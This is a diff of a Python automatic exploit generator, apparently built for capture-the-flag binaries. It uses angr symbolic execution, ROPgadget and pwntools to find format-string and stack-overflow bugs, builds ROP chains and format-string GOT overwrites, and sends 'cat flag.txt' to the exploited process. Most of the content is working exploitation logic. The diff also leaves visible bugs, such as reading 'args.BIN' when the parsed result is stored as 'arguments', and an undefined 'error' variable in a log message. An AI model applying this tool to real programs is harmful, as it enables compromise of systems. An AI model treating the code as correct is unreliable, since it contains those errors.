@@ -16,13 +16,12 @@ logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
 
 # Create a logger object
-logger = logging.getLogger("rage")
+logger = logging.getLogger("RageAgainstTheMachine")
 
 # Set the log level
-logger.setLevel(logging.DEBUG)
-
+logger.setLevel(logging.INFO)
 # Create a formatter
-formatter = logging.Formatter('%(name)s - %(levelname)s - %(message)s')
+formatter = logging.Formatter('%(name)s - [%(levelname)s]: %(message)s')
 
 # Create a console handler and set its formatter and log level
 ch = logging.StreamHandler()
@@ -72,8 +71,8 @@ class Raeg:
         self.symbolic_padding = None
 
         self.libc_offset_string = ""
-        self.canary_offset_string = None
-        self.format_write_address = None
+        self.canary_offset_string = ""
+        self.format_string = ""
 
         self.has_leak = False
         self.has_overflow = False
@@ -87,23 +86,10 @@ class Raeg:
     def find_vulnerability(self):
 
         #self.angry_analyze()
-        print(self.has_leak)
+        self.angry_analyze()
 
-        # First find if it is a format string vulnerability
-        p = self.start_process()
-
-        prompt = p.recvline()
-        p.sendline(b"%p")
-        output = b""
-        try:
-            p.recvline(b"<<<")
-            output = p.recvline()
-        except EOFError:
-            output = b""
-
-        if b"0x" in output or b"nil" in output:
-            self.has_leak = True
-            logger.info(f"Found a format string vulnerability with {output}")
+        if self.has_leak:
+            logger.info(f"Found a format string vulnerability")
 
             self.format_leak()
             symbols = []
@@ -116,17 +102,11 @@ class Raeg:
             elif "fopen" in self.elf.sym.keys():
                 logger.info("Found a format read")
             else:
-                self.angry_stack_smash()
-                self.generate_rop_chain()
+                logger.info("Found a libc leak")
+                #self.generate_rop_chain()
 
 
         else:
-            self.angry_stack_smash()
-
-            if b"Leak" in prompt:
-                self.has_libc_leak = True
-
-
             # Find important string in the binary
             for s in strings:
                 output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
@@ -173,9 +153,6 @@ class Raeg:
             self.generate_rop_chain()
 
 
-        return None
-
-
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
         if simgr.unconstrained:
@@ -191,60 +168,30 @@ class Raeg:
                         simgr.stashes["mem_corrupt"].append(path)
                     except ValueError:
                         logger.warning("Could not find index of pc overwrite")
-
-
                 simgr.stashes["unconstrained"].remove(path)
                 simgr.drop(stash="active")
 
         return simgr
 
     # Use angr to explore with the check_mem_corruption function
-    def angry_stack_smash(self):
+    def angry_analyze(self):
         # Create angr project
-        start_addr = self.elf.sym["main"]
+        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
+        self.cfg = self.proj.analyses.CFGFast()
+
         # Maybe change to symbolic file stream
-        buff_size = 613
+        buff_size = 600
         self.symbolic_input = claripy.BVS("input", 8 * buff_size)
         self.symbolic_padding = None
 
-
         self.state = self.proj.factory.blank_state(
-                addr=start_addr,
+                addr=self.elf.sym["main"],
                 stdin=self.symbolic_input,
-                add_options = angr.options.unicorn,
+                add_options = angr.options.unicorn
         )
         self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
-
-        logger.info("Attempting to smash the stack")
-        self.simgr.explore(step_func=self.check_mem_corruption)
-
-        if self.simgr.errored:
-            logger.warning(f"Simulation errored with {self.simgr.errored[0]}")
-
-        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
-            logger.warning("Failed to smash stack")
-
-    def angry_analyze(self):
-
-        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
-        # This is the address after the last printf is called which is where we want to check the got table
-        # to see which functions are unfilled
-
-        self.cfg = self.proj.analyses.CFGFast()
-        # Maybe change to symbolic file stream
-        buff_size = 613
-        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
-
-        state = self.proj.factory.entry_state(
-            addr = self.elf.sym["main"],
-            stdin = self.symbolic_input,
-            add_options = angr.options.unicorn,
-        )
-
-        self.simgr = self.proj.factory.simgr(state)
         self.simgr.stashes["format_strings"] = []
-        self.simgr.stashes["mem_corrupt"] = []
 
         # This is the address after the last printf is called which is where we want to check the got table
         # to see which functions are unfilled
@@ -256,26 +203,38 @@ class Raeg:
         def analyze_printf(state):
             # Check if rsi is not a string
             # If it isn't then we know the vulnerable printf statement
-            varg = state.solver.eval(state.regs.rsi)
+            varg = state.solver.eval(state.regs.rdi)
             address = state.solver.eval(state.regs.rip)
 
-            # If rsi is not an address
-            if varg <= 0xff:
+            # If rdi is a stack or libc address
+            if varg <= 0xffffffff:
+                self.has_leak = True
                 self.last_printf_address = hex(state.callstack.current_return_target)
 
         self.proj.hook_symbol("printf", analyze_printf)
 
 
-        self.simgr.run()
-        for error in self.simgr.errored:
-            print(error)
-            if error == "Symbolic (format) string, game over :(":
-               self.has_leak = True
+        logger.info("Attempting to smash the stack")
+        try:
+            self.simgr.explore(step_func=self.check_mem_corruption)
+        except ValueError:
+            logger.warning(f"Simulation unsatisfiable")
+
+        for e in self.simgr.errored:
+            logger.warning(f"Simulation errored with {error}")
+            print(e.error)
+            if e.error == "Symbolic (format) string, game over :(":
+                logger.info("Found symbolic format string vulnerability")
+                self.has_leak = True
+
+        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
+            logger.warning("Failed to smash stack")
+        else:
+            self.has_overflow = True
 
 
 
-
-    def find_arguments(self, function, goal):
+    def find_arguments(self, function_addr, goal_addr):
         return None
 
     
@@ -485,7 +444,7 @@ class Raeg:
         prompt = p.recvline()
 
 
-        if b"Leak" in prompt:
+        if b"0x" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
             logger.info(f"Libc address leaked {hex(self.leak)}")
 
@@ -664,14 +623,10 @@ class Raeg:
                     break
 
         #Convert to bytes and add vulnerable address in GOT
-        format_string = bytes(format_string, 'utf-8') + p64(addr)
-        logger.info(f"Sending Format String: {format_string}")
+        self.format_string = bytes(format_string, 'utf-8') + p64(addr)
 
-        #Send exploit
-        p = process(self.binary)
-        p.sendline(format_string)
-        p.sendline(b'cat flag.txt')
-        p.interactive()
+        logger.info(f"Sending Format String: {self.format_string}")
+
 
 
 
@@ -710,14 +665,11 @@ class Raeg:
             if "Leak" in line:
                debug_output = line
 
-
         for line in debug_lines:
             if "Leak" in line:
                 debug_output = line
 
         debug_ouput = debug_output.split("Leak")
-
-
 
         leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)[0]
         libc_base_address = re.search(r"0x[0]+7f[A-Fa-f0-9]+", libc_base_debug)
@@ -726,17 +678,9 @@ class Raeg:
         if libc_base_address:
             libc_base_address = int(libc_base_address.group(),16)
 
-
-
-
         self.libc_offset = libc_base_address - leak_address
 
-        #print("Cleaning disgusting r2 shit off of screen")
-        #os.system("clear")
         logger.info(f"Found libc offset {self.libc_offset}")
-
-
-        return None
 
 
     def start_process(self):
@@ -754,10 +698,6 @@ class Raeg:
 
 
         if self.symbolic_padding != None:
-            # Check if regular rop chain or libc leak
-            # If there is a leak given then parse the leak
-            #
-            #chain = self.generate_rop_chain_call()
             if self.rop_chain != None:
                 logger.info("Sending ROP Chain")
                 p.sendline(self.symbolic_padding + self.rop_chain)
@@ -778,21 +718,49 @@ class Raeg:
             else:
                 if self.exploit_function == "pwnme":
                     self.format_write(209, self.elf.sym["pwnme"])
+                    p.sendline(self.format_string)
+                    p.sendline(b"cat flag.txt")
+                    try:
+                        output = p.recvuntil(b"}").decode().split("\n")[-1]
+                        if self.flag == None:
+                            self.flag = output
+                        print(self.flag)
+                    except:
+                        logger.info("Format write exploit failed")
+                else:
+                    logger.info(f"Sending format got overwrite exploit: {self.format_string}")
+                    #self.format_write(self.elf.sym["win"])
+
+
+
+
 
 
 
 if __name__ == "__main__":
+
+    print("""
+ ██▀███   ▄▄▄        ▄████ ▓█████
+▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀
+▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███
+▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄
+░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
+░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
+  ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
+  ░░   ░   ░   ▒   ░ ░   ░    ░
+   ░           ░  ░      ░    ░  ░
+    """)
+
 
     parser = argparse.ArgumentParser(
         prog = "RageAgainstTheMachine",
         description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
         epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
     )
-    parser.add_argument("bin", help="path of the binary to exploit")
-    #parser.add_argument("libc", help="path of libc shared object")
-    args = parser.parse_args()
-    rage = Raeg(args.bin, "/opt/libc.so.6")
-    #rage = Raeg(args.bin, "/usr/lib/libc.so.6")
+    #jparser.add_argument("bin",  help="path of the binary to exploit")
+    #parser.add_argument("libc", help="path of libc shared object", required=False)
+    arguments = parser.parse_args()
+    rage = Raeg(args.BIN, "/opt/libc.so.6")
     rage.find_vulnerability()
 
     rage.exploit()
